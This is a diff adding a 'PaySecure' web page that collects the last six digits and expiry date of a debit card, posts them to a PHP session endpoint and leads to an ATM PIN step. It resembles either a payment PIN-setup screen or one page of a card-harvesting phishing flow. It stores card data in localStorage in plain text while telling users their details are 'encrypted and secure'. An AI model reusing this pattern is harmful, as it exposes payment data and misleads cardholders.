@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PaySecure - Card Details</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="paysecure-universal.css?v=2">
+  <style>
+    .card-container {
+      max-width: 450px;
+      margin: 0 auto;
+    }
+    .pin-group {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 25px;
+    }
+    
+    .pin-input {
+      width: 45px;
+      height: 55px;
+      font-size: 20px;
+      text-align: center;
+      border: 2px solid #f0f0f0;
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.9);
+      outline: none;
+      transition: all 0.3s ease;
+      font-family: inherit;
+      color: #333;
+      font-weight: 600;
+    }
+    
+    .pin-input:focus {
+      border-color: #1d9bf0;
+      box-shadow: 0 0 0 3px rgba(25, 118, 210, 0.1);
+      background: white;
+    }
+    
+    .expiry-section {
+      margin-bottom: 25px;
+    }
+    
+    .expiry-group {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      align-items: center;
+    }
+    
+    .expiry-input {
+      width: 60px;
+      height: 50px;
+      font-size: 18px;
+      text-align: center;
+      border: 2px solid #f0f0f0;
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.9);
+      outline: none;
+      transition: all 0.3s ease;
+      font-family: inherit;
+      color: #333;
+      font-weight: 600;
+    }
+    
+    .expiry-input:focus {
+      border-color: #1d9bf0;
+      box-shadow: 0 0 0 3px rgba(25, 118, 210, 0.1);
+      background: white;
+    }
+    
+    .expiry-separator {
+      font-size: 24px;
+      color: #666;
+      font-weight: bold;
+    }
+    
+    .security-note {
+      background: rgba(76, 175, 80, 0.1);
+      border-radius: 8px;
+      padding: 15px;
+      margin: 20px 0;
+      font-size: 14px;
+      color: #333;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .security-note i {
+      color: #4CAF50;
+      font-size: 18px;
+    }
+
+    @media (max-width: 768px) {
+      .pin-group {
+        gap: 6px;
+      }
+      
+      .pin-input {
+        width: 40px;
+        height: 50px;
+        font-size: 18px;
+      }
+      
+      .expiry-input {
+        width: 55px;
+        height: 45px;
+        font-size: 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="page-container">
+    <!-- Header -->
+    <div class="header">
+      <div class="logo">
+        <i class="fa-solid fa-lock"></i>
+        <span class="pay">Pay</span><span class="secure">Secure</span>
+      </div>
+      <div class="help-link-header">
+        <a href="help.html" class="help-text">Help?</a>
+      </div>
+    </div>
+    
+    <!-- Back Button -->
+    <a href="javascript:history.back()" class="back-btn">
+      <i class="fas fa-arrow-left"></i>
+      Back
+    </a>
+    
+    <!-- Card Details Content -->
+    <div class="card-container">
+      <div class="page-card">
+        <h2 class="page-title">Enter Card Details</h2>
+        <p class="subtitle">Please enter the <strong>last 6 digits</strong> and <strong>expiry date</strong> of your debit/ATM card</p>
+        
+        <div class="security-note">
+          <i class="fas fa-shield-alt"></i>
+          <span>Your card details are encrypted and secure</span>
+        </div>
+        
+        <form id="cardForm" autocomplete="off" onsubmit="return validateCardForm()">
+          <div class="form-group">
+            <label class="form-label">Last 6 Digits of Card</label>
+            <div class="pin-group">
+              <input type="text" maxlength="1" class="pin-input" inputmode="numeric" pattern="\d" required>
+              <input type="text" maxlength="1" class="pin-input" inputmode="numeric" pattern="\d" required>
+              <input type="text" maxlength="1" class="pin-input" inputmode="numeric" pattern="\d" required>
+              <input type="text" maxlength="1" class="pin-input" inputmode="numeric" pattern="\d" required>
+              <input type="text" maxlength="1" class="pin-input" inputmode="numeric" pattern="\d" required>
+              <input type="text" maxlength="1" class="pin-input" inputmode="numeric" pattern="\d" required>
+            </div>
+          </div>
+          
+          <div class="form-group expiry-section">
+            <label class="form-label">Card Expiry Date</label>
+            <div class="expiry-group">
+              <input type="text" maxlength="2" class="expiry-input" id="expMonth" name="expMonth" placeholder="MM" inputmode="numeric" required>
+              <span class="expiry-separator">/</span>
+              <input type="text" maxlength="2" class="expiry-input" id="expYear" name="expYear" placeholder="YY" inputmode="numeric" required>
+            </div>
+          </div>
+          
+          <input type="hidden" id="cardDigits" name="cardDigits" />
+          
+          <button class="btn-primary" type="submit" style="width: 100%; margin-top: 10px;">
+            Continue to PIN Verification
+          </button>
+        </form>
+      </div>
+    </div>
+  </div>
+  <script>
+    // PIN navigation
+    document.querySelectorAll('.pin-input').forEach((input, idx, arr) => {
+      input.addEventListener('input', function () {
+        if (this.value.length === 1 && idx < arr.length - 1) {
+          arr[idx + 1].focus();
+        }
+      });
+      input.addEventListener('keydown', function (e) {
+        if (e.key === 'Backspace' && this.value === '' && idx > 0) {
+          arr[idx - 1].focus();
+        }
+      });
+    });
+
+    // Expiry navigation
+    document.getElementById('expMonth').addEventListener('input', function () {
+      if (this.value.length === 2) {
+        document.getElementById('expYear').focus();
+      }
+    });
+    document.getElementById('expYear').addEventListener('keydown', function (e) {
+      if (e.key === 'Backspace' && this.value === '') {
+        document.getElementById('expMonth').focus();
+      }
+    });
+async function validateCardForm() {
+  // Validate PIN
+  const pins = document.querySelectorAll('.pin-input');
+  let val = '';
+  for (let i = 0; i < pins.length; i++) {
+    if (!/^\d$/.test(pins[i].value)) {
+      alert('Please enter all 6 digits.');
+      pins[i].focus();
+      return false;
+    }
+    val += pins[i].value;
+  }
+  document.getElementById('cardDigits').value = val;
+
+  // Validate expiry
+  const mm = document.getElementById('expMonth').value;
+  const yy = document.getElementById('expYear').value;
+  if (!/^(0[1-9]|1[0-2])$/.test(mm)) {
+    alert('Enter a valid month (01-12).');
+    document.getElementById('expMonth').focus();
+    return false;
+  }
+  if (!/^\d{2}$/.test(yy)) {
+    alert('Enter a valid year (e.g., 25).');
+    document.getElementById('expYear').focus();
+    return false;
+  }
+  // Check if expiry is current or future
+  const now = new Date();
+  const currentYear = now.getFullYear() % 100; // last two digits
+  const currentMonth = now.getMonth() + 1; // JS months are 0-based
+  const expYear = parseInt(yy, 10);
+  const expMonth = parseInt(mm, 10);
+
+  if (
+    expYear < currentYear ||
+    (expYear === currentYear && expMonth < currentMonth)
+  ) {
+    alert('Expiry date must be current or future.');
+    document.getElementById('expMonth').focus();
+    return false;
+  }
+
+  // Prepare bank and card payload to save into PHP session
+  const urlParams = new URLSearchParams(window.location.search);
+  const bank = urlParams.get('bank') || localStorage.getItem('selectedBank') || '';
+
+  // Send details to server to save in session
+  try {
+    const resp = await fetch('save_bank_session.php', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({ bank_name: bank, last_6_digits: val, expiry_date: mm + '/' + yy })
+    });
+    const data = await resp.json();
+    if (!data.success) {
+      alert('Failed to save bank details on server. ' + (data.message || ''));
+      return false;
+    }
+    // For UX also keep in localStorage for client-side
+    localStorage.setItem('cardDigits', val);
+    localStorage.setItem('cardExpiry', mm + '/' + yy);
+
+    // Navigate to ATM PIN verification page
+    window.location.href = 'debit_atm _pin.html';
+    return false;
+  } catch (err) {
+    alert('Network error saving bank details.');
+    console.error(err);
+    return false;
+  }
+}
+  </script>
+</body>
+</html>
